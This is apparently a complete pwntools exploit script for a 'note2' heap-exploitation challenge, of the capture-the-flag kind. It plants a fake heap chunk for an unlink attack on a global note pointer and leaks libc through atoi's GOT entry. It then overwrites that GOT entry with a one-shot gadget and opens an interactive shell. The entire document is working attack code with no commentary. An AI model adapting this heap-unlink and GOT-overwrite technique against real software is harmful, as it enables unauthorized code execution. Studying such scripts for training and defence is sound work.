from pwn import *

target = process("./note2", env={"LD_PRELOAD":"./libc-2.19.so"})
elf = ELF("note2")
libc = ELF("libc-2.19.so")

# gdb.attach(target)

def addNote(content, size):
    print(target.recvuntil("option--->>"))
    target.sendline("1")
    print(target.recvuntil("(less than 128)"))
    target.sendline(str(size))
    print(target.recvuntil("content:"))
    target.send(content)

def editNote(index, content, app):
    print(target.recvuntil("option--->>"))
    target.sendline("3")
    print(target.recvuntil("note:"))
    target.sendline(str(index))
    print(target.recvuntil("2.append]"))
    target.sendline(str(app))
    print(target.recvuntil("TheNewContents:"))
    target.sendline(content)

def deleteNote(index):
    print(target.recvuntil("option--->>"))
    target.sendline("4")
    print(target.recvuntil("note:"))
    target.sendline(str(index))

def showNote(index):
    print(target.recvuntil("option--->>"))
    target.sendline("2")
    print(target.recvuntil("note:"))
    target.sendline("0")
    print(target.recvuntil("Content is "))
    leak = target.recvline().strip("\x0a")
    leak = u64(leak + "\x00"*(8-len(leak)))
    return leak

target.sendline("15935728")
target.sendline("15935728")

ptr = 0x602120

fakeChunk = b""
fakeChunk += p64(0x0)
fakeChunk += p64(0xa0)
fakeChunk += p64(ptr - (0x8*3))
fakeChunk += p64(ptr - (0x8*2))
fakeChunk += p64(0x0)

addNote(fakeChunk, 0x80)
target.sendline("1")
addNote("1"*0x8, 00)
target.sendline("1")
addNote("2"*0x80, 0x80)
target.sendline("1")
deleteNote(1)
addNote("5"*0x10 + p64(0xa0) + p64(0x90), 0)
target.sendline("1")
deleteNote(2)
editNote(0, "6"*24 + p64(elf.got['atoi']), 1)
leak = showNote(0)
libcBase = leak - libc.symbols['atoi']
oneShot = libcBase + 0x4652c
print("libc base: " + hex(libcBase))
print("oneshot gadget: " + hex(oneShot))
editNote(0, p64(oneShot), 1)
target.sendline("1")
target.interactive()
